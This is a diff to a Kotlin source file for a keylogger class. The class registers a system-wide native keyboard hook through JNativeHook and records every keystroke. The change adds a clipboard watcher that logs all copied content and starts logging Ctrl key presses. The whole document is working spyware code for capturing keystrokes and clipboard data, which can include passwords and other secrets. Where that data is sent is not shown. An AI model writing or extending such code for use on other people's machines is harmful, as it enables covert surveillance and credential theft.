@@ -13,15 +13,36 @@ import kotlin.system.exitProcess
 import kotlin.time.Duration.Companion.milliseconds
 import kotlin.time.Duration.Companion.seconds
 
+/**
+ * Keylogger is a class that implements `NativeKeyListener` to capture and log key events. It also logs
+ * clipboard content changes through a `ClipboardWatcher` instance.
+ *
+ * @property logFormat an instance of `LogFormat` to format logged key events
+ * @property clipboardWatcher an instance of `ClipboardWatcher` to watch and manage clipboard changes
+ * @property keyRegister an instance of `KeyRegister` to save and manage logged key events
+ * @property lastPressedKeyRawCode holds the raw code of the last pressed key
+ */
 class Keylogger : NativeKeyListener {
 
-    private val keyFormat = KeyFormat()
+    private val logFormat = LogFormat()
+    private val clipboardWatcher = ClipboardWatcher()
     private val keyRegister = KeyRegister(timeBetweenFlushes = 500.milliseconds, appendTimestampAfter = 5.seconds)
     @Volatile
     private var lastPressedKeyRawCode = 0
 
+    /**
+     * Hooks the keylogger to the system, setting up a global key listener and a clipboard watcher.
+     */
     fun hook() {
         disableAnnoyingJnativehookLogger()
+        setupGlobalKeyListener()
+        setupClipboardWatcher()
+    }
+
+    /**
+     * Sets up the global key listener by registering the native hook and adding this instance as a native key listener.
+     */
+    private fun setupGlobalKeyListener() {
         try {
             GlobalScreen.registerNativeHook()
         } catch (e: NativeHookException) {
@@ -31,6 +52,26 @@ class Keylogger : NativeKeyListener {
         GlobalScreen.addNativeKeyListener(this)
     }
 
+    /**
+     * Sets up the clipboard watcher by adding a listener that formats and logs clipboard content, and register the
+     * clipboard watcher to lister for clipboard changes.
+     */
+    private fun setupClipboardWatcher() {
+        clipboardWatcher.addListener {
+            val formattedClipboard = logFormat.formatClipboard(it)
+            keyRegister.apply {
+                saveKey(formattedClipboard)
+                forceNewLine()
+            }
+        }
+        SYSTEM_CLIPBOARD.addFlavorListener(clipboardWatcher)
+    }
+
+    /**
+     * Called when a keyboard key is pressed.
+     *
+     * @param event the `NativeKeyEvent` containing information about the key press
+     */
     override fun nativeKeyPressed(event: NativeKeyEvent) {
         if (IS_DEBUG_ENABLED) {
             println("event.keyCode = '${event.keyCode}' ('${NativeKeyEvent.getKeyText(event.keyCode)}'), event.keyChar = '${event.keyChar}', event.rawCode = ${event.rawCode}, event.modifiers = ${event.modifiers}, event.isActionKey = ${event.isActionKey}")
@@ -44,8 +85,11 @@ class Keylogger : NativeKeyListener {
         this.lastPressedKeyRawCode = event.rawCode
 
         coroutineScope.launch {
-            val keyText = keyFormat.format(keyCode = event.keyCode, rawKeyCode = event.rawCode, isShiftPressed = event.hasModifier(NativeKeyEvent.SHIFT_MASK))
+            val keyText = logFormat.formatKey(keyCode = event.keyCode, rawKeyCode = event.rawCode, isShiftPressed = event.hasModifier(NativeKeyEvent.SHIFT_MASK))
             keyRegister.saveKey(keyText)
+            if (event.keyCode == NativeKeyEvent.VC_ENTER) {
+                keyRegister.forceNewLine()
+            }
         }
     }
 
@@ -58,13 +102,15 @@ class Keylogger : NativeKeyListener {
     private companion object {
         /**
          * Keys to debounce (raw codes), that is, do not register consecutive presses of these keys.
+         *
+         * These are the common command keys such as `Ctrl`, `Alt`, etc
          */
         val DEBOUNCED_KEYS = setOf(13, 27, 58, 91, 93, 144, 160, 161, 162, 163, 164, 165)
 
         /**
-         * Keys that should never be logged. These are the common command keys, such as `Ctrl`, `Shift`, etc.
+         * Keys that should never be logged.
          */
-        val BLACKLISTED_KEYS = setOf(3638, NativeKeyEvent.VC_CONTROL, NativeKeyEvent.VC_SHIFT, NativeKeyEvent.VC_ESCAPE, NativeKeyEvent.VC_PAGE_DOWN, NativeKeyEvent.VC_PAGE_UP, NativeKeyEvent.VC_NUM_LOCK, NativeKeyEvent.VC_VOLUME_DOWN, NativeKeyEvent.VC_VOLUME_UP, NativeKeyEvent.VC_VOLUME_MUTE, NativeKeyEvent.VC_MEDIA_PLAY, NativeKeyEvent.VC_PAUSE, NativeKeyEvent.VC_MEDIA_STOP, NativeKeyEvent.VC_MEDIA_NEXT, NativeKeyEvent.VC_MEDIA_PREVIOUS, NativeKeyEvent.VC_MEDIA_EJECT)
+        val BLACKLISTED_KEYS = setOf(3638, NativeKeyEvent.VC_SHIFT, NativeKeyEvent.VC_ESCAPE, NativeKeyEvent.VC_PAGE_DOWN, NativeKeyEvent.VC_PAGE_UP, NativeKeyEvent.VC_NUM_LOCK, NativeKeyEvent.VC_VOLUME_DOWN, NativeKeyEvent.VC_VOLUME_UP, NativeKeyEvent.VC_VOLUME_MUTE, NativeKeyEvent.VC_MEDIA_PLAY, NativeKeyEvent.VC_PAUSE, NativeKeyEvent.VC_MEDIA_STOP, NativeKeyEvent.VC_MEDIA_NEXT, NativeKeyEvent.VC_MEDIA_PREVIOUS, NativeKeyEvent.VC_MEDIA_EJECT)
     }
 }
 
